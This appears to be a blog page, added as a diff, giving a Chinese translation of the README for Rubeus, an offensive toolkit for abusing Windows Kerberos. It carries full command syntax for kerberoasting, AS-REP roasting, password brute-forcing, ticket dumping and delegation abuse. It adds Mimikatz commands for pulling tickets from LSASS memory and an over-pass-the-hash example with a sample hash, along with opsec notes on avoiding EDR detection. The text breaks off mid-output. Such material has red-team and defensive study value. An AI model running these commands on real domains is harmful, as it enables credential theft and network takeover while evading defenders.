@@ -1,0 +1,2815 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Rubeus README翻译">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Rubeus 中文 文档">
+<meta property="og:url" content="http://example.com/2020/09/29/Rubeus-%E4%B8%AD%E6%96%87README/index.html">
+<meta property="og:site_name" content="T4nglong&#39;s Blog">
+<meta property="og:description" content="Rubeus README翻译">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-09-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-29T09:02:45.014Z">
+<meta property="article:author" content="T4nglong">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2020/09/29/Rubeus-%E4%B8%AD%E6%96%87README/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Rubeus 中文 文档 | T4nglong's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">T4nglong's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/09/29/Rubeus-%E4%B8%AD%E6%96%87README/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="T4nglong">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="T4nglong's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Rubeus 中文 文档
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-09-29 00:00:00 / 修改时间：17:02:45" itemprop="dateCreated datePublished" datetime="2020-09-29T00:00:00+08:00">2020-09-29</time>
+            </span>
+
+          
+            <div class="post-description">Rubeus README翻译</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h1><p>原文：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus/blob/master/README.md">https://github.com/GhostPack/Rubeus/blob/master/README.md</a></p>
+<p>Rubeus 是一个 C# 工具集，用于原始 kerberos 交互和滥用。它大量改编自 Benjamin 的 kekeo 项目和 Vincent 的 MakeMeEnterpriseAdmin 项目。Benjamin 和 Vincent 为武器化的硬组成部分做出了充分的贡献，如果没有他们的先前工作，这个项目将不存在。</p>
+<p>Rubeus 使用 <a target="_blank" rel="noopener" href="https://github.com/pornin">Thomas Pornin</a> 的一个名为 <a target="_blank" rel="noopener" href="https://github.com/pornin/DDer">DDer</a> 的 C# ASN.1 解析/编码库，该库具有“类似MIT”的许可。</p>
+<p>Kerberoasting 的 <a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx">KerberosRequestorSecurityToken.GetRequest</a> 方法由 <a target="_blank" rel="noopener" href="https://twitter.com/machosec">@machosec</a> 贡献给 PowerView。</p>
+<p><a target="_blank" rel="noopener" href="https://twitter.com/elad_shamir">Elad Shamir</a> 为基于资源的受限委派做出了必不可少的共享。</p>
+<p><a target="_blank" rel="noopener" href="https://twitter.com/harmj0y">@harmj0y</a> 是该代码的主要作者。</p>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="命令行使用"><a href="#命令行使用" class="headerlink" title="命令行使用"></a>命令行使用</h3><pre><code>   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+ 票据的请求与续订
+
+    根据一个用户的密码/hash 请求一个 TGT，可选择保存为一个文件，或应用于当前会话，或指定 LUID
+        Rubeus.exe asktgt /user:USER &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap]
+
+    根据一个用户的密码/hash 请求一个 TGT，创建一个 /netonly 进程，并将票据应用到新的进程/登录会话
+        Rubeus.exe asktgt /user:USER &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH&gt; /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
+
+    为一个或多个 SPN 请求一个服务票据，可选择保存或应用该票据
+        Rubeus.exe asktgs &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; &lt;/service:SPN1,SPN2,...&gt; [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]
+
+    续订一个 TGT，可选择应用该票据，或保存，或自动续订该票据直到其续订截止
+        Rubeus.exe renew &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]
+
+    执行一个基于 kerberos 的密码爆破攻击
+        Rubeus.exe brute &lt;/password:PASSWORD | /passwords:PASSWORDS_FILE&gt; [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER &amp; /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]
+
+
+ 滥用受限委派
+
+    执行 S4U 滥用受限委派
+        Rubeus.exe s4u &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; &lt;/impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI&gt; /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]
+        Rubeus.exe s4u /user:USER &lt;/rc4:HASH | /aes256:HASH&gt; [/domain:DOMAIN] &lt;/impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI&gt; /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]
+
+    执行 S4U 滥用受限委派（跨域）
+        Rubeus.exe s4u /user:USER &lt;/rc4:HASH | /aes256:HASH&gt; [/domain:DOMAIN] &lt;/impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI&gt; /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap]
+
+
+ 票据管理
+
+    提交一个 TGT，可选择针对特定的 LUID（如果已提权）
+        Rubeus.exe ptt &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/luid:LOGINID]
+
+    清除当前登录会话中的票据，可选择针对特定的 LUID（如果已提权）
+        Rubeus.exe purge [/luid:LOGINID]
+
+    解析和描述一个票据（服务票据或 TGT）
+        Rubeus.exe describe &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt;
+
+
+ 票据的提取和收集
+
+    为所有当前票据进行分类（如果已提权，列出所有用户的），可选择针对特定的 LUID、用户名、或服务
+        Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]
+
+    详细地列出所有的当前票据（如果已提权，列出所有用户的），可选择针对特定的 LUID
+        Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]
+
+    导出所有的当前票据数据（如果已经提权，导出所有用户的），可选择针对特定的服务/LUID
+        Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]
+
+    在非管理员权限的情况下，通过滥用 kerberos GSS-API（伪造委派），检索当前登录用户的可用 TGT .kirbi（带会话密钥），
+        Rubeus.exe tgtdeleg [/target:SPN]
+
+    根据 /interval 参数（默认 60 秒），监控新的 TGT
+        Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME]
+
+    每隔 60 秒监控新的 TGT，可通过 /monitorinterval 指定间隔时间，自动续订 TGT，并且每隔 1200 秒显示工作缓存，可通过 /displayinterval 指定间隔时间
+        Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME]
+
+
+ 烘烤
+
+    执行 kerberoasting
+        Rubeus.exe kerberoast [/spn:&quot;blah/blah&quot;] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:&quot;OU=,...&quot;] [/nowrap]
+
+    执行 kerberoasting，输出 hash 到一个文件
+        Rubeus.exe kerberoast /outfile:hashes.txt [/spn:&quot;blah/blah&quot;] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:&quot;OU=,...&quot;]
+
+    执行 kerberoasting，以文件输出格式输出 hash 值，输出到控制台：
+        Rubeus.exe kerberoast /simple [/spn:&quot;blah/blah&quot;] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:&quot;OU=,...&quot;] [/nowrap]
+
+    使用备用凭证执行 Kerberoasting
+        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:&quot;blah/blah&quot;] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:&quot;OU=,...&quot;] [/nowrap]
+
+    使用一个现有的 TGT 执行 kerberoasting
+        Rubeus.exe kerberoast /spn:&quot;blah/blah&quot; &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; [/nowrap]
+
+    使用 tgtdeleg 票据执行 kerberoasting，来请求服务票据 - 为 AES 账户请求 RC4 
+        Rubeus.exe kerberoast /usetgtdeleg [/nowrap]
+
+    使用 tgtdeleg 执行 Kerberoasting，并过滤掉启用 AES 的帐户：
+        Rubeus.exe kerberoast /rc4opsec [/nowrap]
+
+    找到可进行 Kerberoast 的账户，列出相关的统计信息，无需实际发送票据请求
+        Rubeus.exe kerberoast /stats [/nowrap]
+
+    执行 Kerberoasting，仅为 admincount=1 的帐户请求票证（自定义 LDAP 过滤器）
+        Rubeus.exe kerberoast /ldapfilter:&#39;admincount=1&#39; [/nowrap]
+
+    执行 Kerberoasting，仅请求密码最后设置在 01-31-2005 和 03-29-2010 之间的帐户的票据，返回最多5个服务票据:
+        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/nowrap]
+
+    执行 AES Kerberoasting
+        Rubeus.exe kerberoast /aes [/nowrap]
+
+    为任何无需预验证的账户执行 AS-REP Roasting
+        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:&quot;OU=,...&quot;] [/nowrap]
+
+    为任何无需预验证的账户执行 AS-REP Roasting，以 hashcat 的格式输出到一个文件
+        Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:&quot;OU=,...&quot;]
+
+    使用备用凭证，为任何无需预验证的账户执行 AS-REP Roasting
+        Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:&quot;OU,...&quot;] [/nowrap]
+
+
+ 杂项
+
+    通过随机 /netonly 凭证，创建一个新的隐藏进程（除非指定了 /show），显示 PID 和 LUID
+        Rubeus.exe createnetonly /program:&quot;C:\Windows\System32\cmd.exe&quot; [/show]
+
+    通过提供 TGT 重置用户的密码（AoratoPw）
+        Rubeus.exe changepw &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /new:PASSWORD [/dc:DOMAIN_CONTROLLER]
+
+    计算 rc4_hmac、aes128_cts_hmac_sha1、aes256_cts_hmac_sha1、des_cbc_md5 哈希：
+        Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]
+
+    替换一个 sname 或 SPN 到一个现有的服务票据中
+        Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid] [/nowrap]
+        Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid] [/nowrap]
+
+    显示当前用户的 LUID
+        Rubeus.exe currentluid
+
+    &quot;/consoleoutfile:C:\FILE.txt&quot; 这个参数，将所有控制台的输出重定向到一个指定文件中
+
+    &quot;/nowrap&quot; 以一行的方式显示 base64 编码的票据 blob（不换行）
+
+
+ 注意：经过 base64 编码后的票据 blob 可以通过以下方式解码
+    [IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;aa...&quot;))</code></pre>
+<h3 id="Opsec-笔记"><a href="#Opsec-笔记" class="headerlink" title="Opsec 笔记"></a>Opsec 笔记</h3><p>本节涵盖有关在环境中使用 Rubeus 的操作安全性的一些说明，并提供一些技术示例来比较/对比其在 Mimikatz 上的某些方法。 此处的材料将在将来进行扩展。</p>
+<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>你在系统上执行的任何操作都有被检测到的风险，尤其是以 “怪异” 的方式来滥用某个功能时。通常可以从主机、网络、域的角度以多种方法检测 Rubeus。我有一个同事喜欢说：“所有东西都是隐秘的，直到有人开始寻找它为止”，工具和技术通常会逃避检测，因为：1）人们对工具、技术没有足够的意识，因此没有注意到；2）人们没有以适当的规模来收集和处理所需的数据；3）工具、技术和现有的行为混合在一起，以在环境中充分掩盖误报。</p>
+<p>关于这些缓解措施的更多信息：<a target="_blank" rel="noopener" href="https://twitter.com/mattifestation">Matt Graeber</a> 和 <a target="_blank" rel="noopener" href="https://twitter.com/tifkin_">Lee Christensen</a>’s Black Hat USA 2018 <a target="_blank" rel="noopener" href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Graeber-Subverting-Sysmon-Application-Of-A-Formalized-Security-Product-Evasion-Methodology.pdf">“Subverting Sysmon”</a> 演讲和相关 <a target="_blank" rel="noopener" href="https://specterops.io/assets/resources/Subverting_Sysmon.pdf">whitepaper</a>.</p>
+<p>从主机角度看，Rubeus 可以在初始武器化阶段被捕获到，通过一个异常（非 lsass.exe）进程发出原始的 kerberos 端口 88 流量，通过使用诸如 LsaCallAuthenticationPackage() 的敏感 API，或者在主机上存在异常的票据（例如：在现代环境中，票据中使用 rc4_hmac）</p>
+<p>从网络或域控制器日志的角度来看，由于 Rubeus 实现了普通 Kerberos 协议的许多部分，因此主要的检测方法涉及在 Kerberos 交换中使用 rc4_hmac。 现代 Windows 域（功能级别 2008 及更高版本）在常规 Kerberos 交换中默认使用 AES 加密（除了一些例外，如域间信任票据）。 在 Kerberos 交换中使用 rc4_hmac（NTLM）hash 代替 aes256_cts_hmac_sha1（或 aes128）密钥会导致在主机级别，网络级别可检测到某些信号（如果已解析 Kerberos 通信） 和域控制器事件日志级别，有时也称为 “加密降级”。</p>
+<h4 id="武器化"><a href="#武器化" class="headerlink" title="武器化"></a>武器化</h4><p>检测攻击工具的一种常见方法是通过代码的武器化向量。 </p>
+<p>如果 Rubeus <a href="#sidenote-running-rubeus-through-powershell">通过PowerShell</a>（包括Empire）运行，则所有标准的 PowerShell V5 保护都适用（深度脚本块日志记录，AMSI 等）。 </p>
+<p>如果 Rubeus 作为磁盘上的二进制文件执行，则标准的 AV 签名检测将起作用（这是我们<a href="#compile-instructions">不发布</a> Rubeus 编译版本的部分原因，因为脆弱的签名很愚蠢;）。 </p>
+<p>如果将 Rubeus 用作<a href="#sidenote-building-rubeus-as-a-library">库</a>，那么它很容易受到主要工具运行时使用的任何方法的影响。</p>
+<p>如果 Rubeus 是通过非托管程序集执行（例如 Cobalt Strike 的 <code>execute_assembly</code>）运行的，则将执行跨进程代码注入，并将 CLR 加载到潜在的非 .NET 进程中，尽管使用此方法执行任何 .NET 的代码时都会出现这个信号。</p>
+<p>此外，AMSI (防病毒扫描接口) 也已经添加到 .NET4.8 中，<a target="_blank" rel="noopener" href="https://twitter.com/cobbr_io">Ryan Cobb</a> 在他的文章的防守部分有更多关于进攻暗示的细节。 <a target="_blank" rel="noopener" href="https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462">“Entering a Covenant: .NET Command and Control”</a> </p>
+<h4 id="例子：提取凭证"><a href="#例子：提取凭证" class="headerlink" title="例子：提取凭证"></a>例子：提取凭证</h4><p>假设我们在计算机上具有较高的访问权限，并希望提取用户凭据以进行重用。</p>
+<p>Mimikatz 是获取凭证的瑞士军刀，它提供了多种选择。<code>sekurlsa::logonpasswords </code>命令将打开一个读取 LSASS 的句柄，枚举系统上存在的登录会话，遍历每个登录会话的默认身份验证包，并提取存在的任何可逆的密码、凭证材料。<strong>备注</strong>：<code>sekurlsa::ekeys</code> 命令将枚举 kerberos 包中存在的所有密钥类型。</p>
+<p>Rubeus 没有任何代码接触 LSASS（并且没有意图去接触），因此它的功能仅限于通过使用 LsaCallAuthenticationPackage() API 提取 kerberos 票据。从没有提权的角度看，不会返回 TGT 的会话密钥（默认情况下），因此只有提取的服务票据是可用的（tgtdeleg 命令使用一个 kekeo 技巧为当前用户获取可用的 TGT）在一个高完整度的上下文中，将通过 “Getsystem” 提升到 system 权限，并调用 LsaRegisterLogonProcess() API 注册 假的登录应用程序。 这允许特权 枚举和提取系统中在 LSA 上注册的所有票证，从而输出 base64 编码的 .kirbi，以供以后重用。</p>
+<p>Mimikatz 可以使用以下命令执行 base64 .kirbi 提取：</p>
+<pre><code>mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # standard::base64 /output:true
+mimikatz # kerberos::list /export</code></pre>
+<p>Mimikatz 还可以使用以下命令直接从 LSASS 内存中提取票据：</p>
+<pre><code>mimikatz # privilege::debug
+mimikatz # standard::base64 /output:true
+mimikatz # sekurlsa::tickets /export</code></pre>
+<p>由于 “在有人寻找之前，一切都是隐身的”，因此通过 LsaCallAuthenticationPackage() API 调用进行 LSASS 操作或提取票证 是否更“隐秘”是有争议的。 由于 Mimikatz 的流行，打开 LSASS 的句柄并读取/写入其内存已成为 EDR 检测和/或预防的重要目标。 但是，相当有限的一组进程使用 LsaCallAuthenticationPackage()，并且使用 LsaRegisterLogonProcess() 创建假的登录应用程序也是相当异常的行为。 但是，与 LSASS 保护相比，完整的 API 级别的检测和基准确定似乎是一个更困难的技术问题。</p>
+<h4 id="例子：-Over-pass-the-hash"><a href="#例子：-Over-pass-the-hash" class="headerlink" title="例子： Over-pass-the-hash"></a>例子： Over-pass-the-hash</h4><p>假设我们获取了用户的 rc4_hmac hash (NTLM) 并且希望重用此凭证来控制其他的机器，当该用户账户具有高访问权限时。</p>
+<p><strong>备注:</strong> pass-the-hash 不等于 over-pass-the-hash。 传统的 pass-the-hash 涉及通过 NTLMv1 / NTLMv2 协议重用 hash，不会涉及到 kerberos 协议。over-pass-the-hash 方法由  Benjamin 和 Skip Duckwall 开发，这种方法将域用户的 hash/key（rc4_hmac, aes256_cts_hmac_sha1, etc.）转换为 TGT。</p>
+<p>我们可以对比使用 mimikatz <code>sekurlsa::pth</code> 命令和使用 Rubeus <code>asktgt</code> 来执行 “over-passing-the-hash” 的不同：</p>
+<p>1）当使用 mimikatz 的  <code>sekurlsa::pth</code> 命令进行 over-pass-the-hash，mimikatz 会先使用假的凭证创建一个新的登录类型为 9 的进程 - 这将创建一个新的 “祭品” 登录会话，该会话不会与当前登录会话交互。然后，它打开能够写入进程内存的 LSASS 进程，将提供的 hash/key 覆盖到关联的登录会话（祭品 登录会话）的相应部分。这将导致正常的 kerberos 身份验证过程启动，就像用户进行正常登录一样，将提供的 hash 转换为完整的 TGT。</p>
+<p>2）当使用 Rubeus 的 <code>asktgt</code> 命令进行 over-pass-the-hash，将使用原始的 kerberos 协议来请求 TGT，如果提交了 /ptt 参数，则该 TGT 将应用于当前登录会话。</p>
+<p>1）使用 mimikatz 途径时，在直接操作 LSASS 内存时需要管理权限。如前所述，mimikatz 的流行还导致这种行为成为 EDR 检测和防护的的主要目标。</p>
+<p>2）采用 Rubeus 或 kekeo 途径时，由于未涉及到 LSASS，因此不需要管理权限。但是，如果将票据应用于当前登录会话（使用 /ptt），则当前登录会话的 TGT 将被覆盖。通过使用 /createnetonly 命令创建一个 “祭品” 进程/登录会话，然后对新创建的进程 LUID 使用 <code>/ptt /ticket:X /luid:0xa..</code>，可以避免这种行为（具备管理访问权限）。</p>
+<p>如果使用 Cobalt Strike，请使用伪凭证执行 make_token 命令，然后使用 Rubeus 获取的票据 执行 kerberos_ticket_use ，这样就可以应用新的 TGT，1）不需要管理权限；2）不会踩踏当前会话的 TGT。</p>
+<p>备注：使用 make_token DOMAIN\user password 来使用对于目标有效的凭据来填充你的当前令牌</p>
+<p>我们认为，由于该技术的普及，LSASS 操作方法更有可能被检测或缓解。但是 Rubeus 的方法确实导致了另一种可检测的行为。到 88 端口的 kerberos 流程通常仅来自 lsass.exe，如果可以收集信息，则可以检测到来自 异常进程 的此类原始流量。</p>
+<p>备注：可能同时捕捉这两种操作方式的另一种方法，就是前面提到的 “加密降级“ 检测。要检索 AES key，可以使用 mimikatz 的 <code>sekurlsa::ekeys</code> 模块来返回所有 kerberos 加密 key（类似于 <code>lsadump :: dcsync</code>），在尝试逃避某些检测时可以使用。</p>
+<h2 id="票据请求和续订"><a href="#票据请求和续订" class="headerlink" title="票据请求和续订"></a>票据请求和续订</h2><p>票据请求命令的类别：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="#asktgt">asktgt</a></td>
+<td>通过一个 hash/key 或者密码请求一个 TGT</td>
+</tr>
+<tr>
+<td><a href="#asktgs">asktgs</a></td>
+<td>通过一个已通过的 TGT 来请求一个服务票据</td>
+</tr>
+<tr>
+<td><a href="#renew">renew</a></td>
+<td>续订（或自定续订）一个 TGT 或服务票据</td>
+</tr>
+<tr>
+<td><a href="#brute">brute</a></td>
+<td>执行一个基于kerberos 的密码暴力破解攻击</td>
+</tr>
+</tbody></table>
+<h3 id="asktgt"><a href="#asktgt" class="headerlink" title="asktgt"></a>asktgt</h3><p><strong>asktgt</strong> 操作将为指定的用户和加密密钥（<code>/rc4</code>, <code>/aes128</code>, <code>/aes256</code>, or <code>/des</code> ）创建原始的 AS-REQ (TGT 请求) 数据。也可以使用 <code>/password</code> 参数来代替 hash，在这种情况下，<code>/enctype:X</code> 将默认使用 RC4 进行交换，并使用 <code>des|aes128|aes256</code> 作为选项。</p>
+<p>如果没有指定 <code>/domain</code> 参数，则默认使用主机当前所在域，如果没有指定 <code>/dc</code> 参数，则使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/dsgetdc/nf-dsgetdc-dsgetdcnamea">DsGetDcName</a> 来获取主机当前所在域的域控。如果认证成功，则解析收到的 AS-REP 并将 KRB-CRED（一个包含用户 TGT 的.kirbi 文件）输出为 base64 格式的 blob。</p>
+<p>如果指定 <code>/ptt</code> 参数，则将执行 “pass the ticket”，即将生成的 Kerberos 凭证应用于当前登陆会话。而 <code>/luid:0xA..</code> 参数则将生成的票据应用于指定的登陆会话 ID（需要管理员权限）。</p>
+<p>如果指定了 <code>/createnetonly:C:\X.exe</code> 参数，则将使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithlogonw">CreateProcessWithLogonW()</a> 创建一个新的隐藏进程（除非指定了 <code>/show</code> 参数），其SECURITY_LOGON_TYPE被设置为9，相当于 runas /netonly。然后请求到的票据将应用于这个新的登录会话。</p>
+<p>请注意，不需要在主机上提升权限，就可以请求 TGT，或将其应用于当前登录会话，只需要目标用户的正确 hash 即可。另外一个注意事项是：一次只能将一个 TGT 应用于当前登录会话。因此，使用 /ptt 选项应用新票据时会清除之前的 TGT。一个解决方法是，使用 <code>/createnetonly:C:\X.exe</code> 参数（除非指定了<code>/show</code>标志，否则默认情况下将隐藏进程）， 或者使用 <code>ptt /luid:0xA..</code> 来请求票据并应用于另外的登陆会话。</p>
+<p>通过 RC4 hash 为 <strong><a href="mailto:&#100;&#x66;&#109;&#46;&#x61;&#64;&#116;&#x65;&#x73;&#116;&#108;&#x61;&#98;&#x2e;&#108;&#111;&#99;&#97;&#x6c;">&#100;&#x66;&#109;&#46;&#x61;&#64;&#116;&#x65;&#x73;&#116;&#108;&#x61;&#98;&#x2e;&#108;&#111;&#99;&#97;&#x6c;</a></strong> 用户请求一个票据，并将其应用于当前登录会话：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.1
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: &#39;testlab.local\dfm.a&#39;
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
